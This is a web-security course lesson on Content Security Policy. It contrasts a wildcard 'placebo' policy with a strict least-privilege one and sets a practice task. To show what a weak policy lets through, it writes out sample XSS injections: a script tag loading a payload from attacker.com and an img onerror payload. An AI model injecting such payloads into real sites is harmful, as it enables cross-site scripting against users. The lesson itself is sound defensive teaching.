💡 CI01.4.2: The Rulebook: Building Your First CSP

**Outline:**

- **The Threat (SEEI):** An overly permissive or poorly constructed CSP can provide a false sense of security while offering little real protection.
- **The Defense (PPP):** Learning the most important CSP directives and how to combine them to build a basic, effective policy.
- **Your Mission (Production):** Write a CSP for a simple web page.

### 📘 Full Lesson Content

### Part 1: Presentation - The Threat (SEEI)

**What is it? (The Vulnerability):**

A common mistake is creating a "placebo" CSP. A developer, knowing they need a CSP, might create a policy that is so broad and permissive that it blocks nothing. Using wildcards (`*`) or "unsafe" keywords defeats the purpose of an allowlist. This creates a false sense of security where the team believes they are protected, but the policy is effectively useless.

**How it Works (The Attack Vector):**

A team implements the following CSP, thinking it's better than nothing.

```tsx
// VULNERABLE CSP - Too permissive
Content-Security-Policy:
  script-src * 'unsafe-inline' 'unsafe-eval';
  img-src * data:;

```

This policy is nearly worthless:

- `script-src *`: Allows scripts from _any_ domain on the internet.
- `'unsafe-inline'`: Allows inline `<script>` tags and `onclick` handlers, which are primary XSS vectors.
- `'unsafe-eval'`: Allows `eval()`, another dangerous function.
- `img-src * data:`: Allows images from any domain and from `data:` URIs.

An attacker finds an XSS flaw. They can still inject `<script src="<https://attacker.com/payload.js>">` because `*` allows it. They can still inject `<img src=x onerror=alert(1)>` because `'unsafe-inline'` allows it. The CSP provided no protection.

### Part 2: Practice - The Defense (PPP)

**The Golden Rule:**

The principle for a strong CSP is **"Start with Nothing, Add Only What's Necessary."** A good policy is built on the principle of least privilege. You begin by locking everything down and then selectively open up only the specific sources your application truly needs to function.

**Secure Code Implementation (Building a Policy):**

Let's build a basic, secure policy for a simple, self-contained web app.

1. **Set a default:** `default-src 'none';`
    - This is the foundation. It says: "By default, block everything. No scripts, no images, no styles, no fonts, no API calls." The page will be blank and broken. This is a good starting point.
2. **Allow necessary scripts:** `script-src 'self';`
    - This allows the browser to execute JavaScript files served from your own domain (e.g., your compiled React bundle). It blocks all other domains and forbids inline scripts.
3. **Allow necessary styles:** `style-src 'self' 'unsafe-inline';`
    - We allow stylesheets from our own domain. We've temporarily added `'unsafe-inline'` because many tools (like Emotion or Styled-components) inject styles directly into `<style>` tags in the head. This is a common trade-off, though there are more secure ways to handle it.
4. **Allow necessary images:** `img-src 'self' <https://images.my-cdn.com>;`
    - We allow images from our own domain and from our trusted image CDN. All other image sources will be blocked.
5. **Allow necessary API calls:** `connect-src 'self' <https://api.my-app.com>;`
    - This allows `fetch` or XHR calls to our own domain and our primary API backend.

**Putting it all together:**

```tsx
// SECURE CSP - A strong starting point
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' <https://images.my-cdn.com>;
  connect-src 'self' <https://api.my-app.com>;
  font-src 'self';
  frame-ancestors 'none';

```

This policy is specific and restrictive. It provides a massive security improvement over the default browser behavior.

### 🧠 Real-World Case Study: "Permissive vs. Strict Policy"

**The Goal:** Secure a marketing website that uses Google Analytics.

- **Vulnerable (Permissive) Approach:** `script-src *;`
    - **Result:** The policy is easy to write and Google Analytics works. However, if an XSS flaw is found, an attacker can also load their malicious script from any domain on the internet. The policy is useless.
- **Secure (Strict) Approach:** `script-src 'self' <https://www.google-analytics.com>;`
    - **Result:** The policy explicitly allows scripts from the site's own domain and from Google Analytics. It takes slightly more effort to find the correct domain to allowlist, but the security benefit is enormous. An attacker can no longer load a script from `attacker.com`.

### 🤔 Reflective Questions

1. Why is `default-src 'none'` considered a best practice for starting a new CSP? What does it force the developer to do?
2. Many modern React apps are client-side rendered (CSR) and served as static files from a CDN. In this case, what does `'self'` refer to?

### 📚 Further Reading

- **MDN:** [CSP Directives](https://www.google.com/search?q=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources%23directives) - A complete list of all available CSP directives.
- **Scott Helme:** [CSP Cheat Sheet](https://scotthelme.co.uk/csp-cheat-sheet/) - A great resource with practical examples.

### 📝 Mini Task (Production)

You are building a simple portfolio website with the following characteristics:

- All your JavaScript and CSS files are hosted on the same domain as the HTML file.
- Images are loaded from your domain and also from `https://unsplash.com`.
- The site makes one API call to `https://api.github.com` to fetch your repositories.
- There are no iframes or fonts.

Your task: **Write a complete, strict CSP header** for this website. Start with `default-src 'none';`.